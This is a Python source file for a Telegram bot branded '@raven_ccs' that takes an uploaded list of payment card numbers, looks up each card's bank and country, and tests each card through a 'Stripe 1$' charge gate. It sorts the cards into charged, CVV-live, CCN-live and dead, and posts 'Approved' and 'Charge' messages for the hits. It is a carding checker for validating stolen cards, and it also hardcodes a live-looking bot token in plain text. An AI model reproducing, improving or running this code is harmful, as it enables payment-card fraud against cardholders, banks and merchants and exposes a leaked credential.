try:
    import requests
    import telebot
    from telebot import types
    from gatet import Tele 
    import subprocess
except:
    import os
    os.system("pip install requests")
    os.system("pip install telebot")
    os.system("pip install subprocess")

token = "6970943600:AAEwEyhGU_Rz6kYjTnlgI9KssYFhKAKEMw0" 
bot=telebot.TeleBot(token,parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,"Send the file now")
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	live = 0
	ccn = 0
	ch = 0
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
			
				try:
					data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
					
				except:
					pass
				try:
					bank=(data['bank']['name'])
				except:
					bank=('unknown')
				try:
					emj=(data['country']['emoji'])
				except:
					emj=('unknown')
				try:
					cn=(data['country']['name'])
				except:
					cn=('unknown')
				try:
					dicr=(data['scheme'])
				except:
					dicr=('unknown')
				try:
					typ=(data['type'])
				except:
					typ=('unknown')
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"• 𝗛𝗜𝗧𝗦 ✅: [ {ch} ] •", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"• 𝗖𝗩𝗩 ☑️ : [ {live} ] •", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• 𝗖𝗖𝗡 ❎: [ {ccn} ] •", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗔𝗗 ❌  : [ {dd} ] •", callback_data='x')
				cm6 = types.InlineKeyboardButton(f"• 𝗧𝗼𝘁𝗮𝗹 👻 : [ {total} ] •", callback_data='x')
				mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
𝗕𝗬 ⇾ @raven_ccs''', reply_markup=mes)
				
				try:
					last = str(Tele(cc))
				except Exception as e:
					print(e)
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "Your card was declined."
				
				msg = f'''𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎

𝗖𝗖 ⇾ {cc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ ccn Live

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {cc[:6]} - {dicr} - {typ} 
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {cn} - {emj} 

𝗕𝗬: @raven_ccs '''
				print(last)
				if "Your card's security code is" in last:
					bot.reply_to(message, msg)
					ccn += 1
					msg2 = f'''𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝗖𝗖 ⇾ {cc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ insufficient funds

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {cc[:6]} - {dicr} - {typ} 
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {cn} - {emj} 

𝗕𝗬: @raven_ccs '''
				elif "Your card has insufficient funds." in last:
					live += 1
					bot.reply_to(message, msg2)
				elif "success" in last:
					ch += 1
					msg1 = f'''𝗖𝗵𝗮𝗿𝗴𝗲 ✅

𝗖𝗖 ⇾ {cc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Success

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {cc[:6]} - {dicr} - {typ} 
𝗕𝗮𝗻𝗸: {bank} 
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {cn} - {emj} 

𝗕𝗬: @raven_ccs '''
					bot.reply_to(message, msg1)
				else:
					dd += 1
	except:
		pass
print("bot is working")
bot.polling()